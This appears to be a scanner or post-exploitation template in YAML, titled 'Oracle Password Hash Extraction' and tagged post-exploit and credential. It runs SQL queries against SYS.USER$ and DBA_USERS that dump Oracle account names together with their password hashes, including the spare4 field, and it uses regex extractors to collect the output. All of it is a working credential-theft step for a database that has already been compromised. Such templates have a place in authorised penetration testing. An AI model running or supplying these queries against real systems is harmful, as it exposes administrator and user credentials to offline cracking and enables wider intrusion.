id: oracle-password-hash-extract
service: [oracle]
info:
  name: Oracle Password Hash Extraction
  severity: critical
  tags: oracle,post-exploit,credential,hash

services:
  - ops:
      - db: "SELECT 'hash=' || name || ':' || password || ':' || spare4 FROM SYS.USER$ WHERE password IS NOT NULL AND type# = 1"
        name: sys_hashes
      - db: "SELECT 'dbahash=' || username || ':' || password FROM DBA_USERS WHERE password IS NOT NULL"
        name: dba_hashes
    extractors:
      - type: regex
        name: oracle_sys_hashes
        part: sys_hashes
        regex: ['(?m)^hash=(.+)$']
      - type: regex
        name: oracle_dba_hashes
        part: dba_hashes
        regex: ['(?m)^dbahash=(.+)$']
